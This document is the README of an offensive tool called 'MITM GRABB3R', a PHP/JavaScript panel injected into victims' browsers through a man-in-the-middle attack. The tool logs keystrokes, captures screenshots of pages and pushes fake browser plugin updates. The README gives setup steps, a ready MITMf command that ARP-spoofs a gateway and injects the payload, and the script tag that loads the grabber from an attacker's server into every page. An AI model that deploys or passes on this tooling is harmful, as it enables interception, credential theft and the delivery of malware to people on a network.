
**MITM GRABB3R** is a PHP (MySQL) script that uses Javascript code to do various XSS "attacks" after you inject it via mitm attack.

INFO
===

This script can capture keystrokes of user input on websites, capture screenshots of pages and run fake browser plugin update.

Each clients history and captures can be viewed on a timeline.

!["DEMO"](http://s12.postimg.org/48hx4cc3f/grabber.png)

HOW TO SET SCRIPT
===

Create and import database.sql in MySQL 

Upload php script from www to folder on your http server.

Edit

	/includes/settings.ini.php
	/includes/config.ini.php
	
Default web login is:

	Username:admin
	Password:1234
	
HOW TO: MITMf
===

Replace inject.py in plugins folder ( MITMf 0.9.8 ) with inject.py that contains small changes.


Example cmd:

	python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --inject --grabber-url http://192.168.1.5/mitm/inject.php


Use other MITM software?
===

This script was tested on and used with MITMf but should be able to use it without any issues with other software.

If you make plugin for other software contact me and i will add plugin for it.

You need to inject code bellow into every page and then wait for data in panel.

	<script type="text/javascript" src="http://IP_OR_DOMAIN_AND_SCRIPT_PATH/inject.php?ip=IP_ADDRESS_OF_VICTIM"></script>

	
	
Contact
===

Twitter: @ivangr0zni